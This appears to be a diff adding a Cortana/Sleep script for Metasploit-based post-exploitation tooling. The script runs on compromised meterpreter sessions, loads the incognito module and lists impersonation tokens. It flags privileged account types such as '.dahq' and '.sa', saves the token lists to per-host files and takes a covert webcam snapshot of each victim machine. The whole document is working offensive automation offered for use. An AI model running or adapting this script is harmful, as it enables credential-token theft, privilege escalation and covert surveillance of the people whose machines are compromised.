@@ -1,0 +1,46 @@
+sub cmd_listtokens {
+	if ($1[0] eq "all") {
+		foreach $sid (session_ids()) {
+			println("Listing tokens on session: $sid");
+			m_cmd($sid, "use incognito");
+		}
+	} else {
+		foreach $sid ($1) {
+			println("Listing tokens on session: $sid");
+			m_cmd($sid, "use incognito");
+		}
+	}
+}
+
+on meterpreter_use {
+	println("Incognito loaded on $1");
+	m_cmd($1, "list_tokens -u");
+}
+
+on meterpreter_list_tokens {
+	local('$handle $line $acct_types $acct_type');
+
+	$acct_types = @(".dahq", ".oa", ".sa");
+
+	println("list_tokens: ");
+	println("$3");
+
+	foreach $line (split("\n", $3)) {
+		foreach $acct_type ($acct_types) {
+			if ($line hasmatch $acct_type) {
+				elog("[+] $acct_type ACCOUNT FOUND -> " . session_host($1) . " ( sid: $1 ) !!!!");
+				elog("[+] $line");
+			}
+		}
+	}
+
+	$handle = openf(">>". session_host($1) . "_listtokens.txt");
+	print($handle, $3);
+	closef($handle);	
+
+	m_cmd($1, "webcam_snap -p " . session_host($1) . "_webcam.jpg");
+}
+
+sub help_listtokens {
+	return "Specify sessions ids or \"all\" to list the tokens from the specified sessions.";
+}
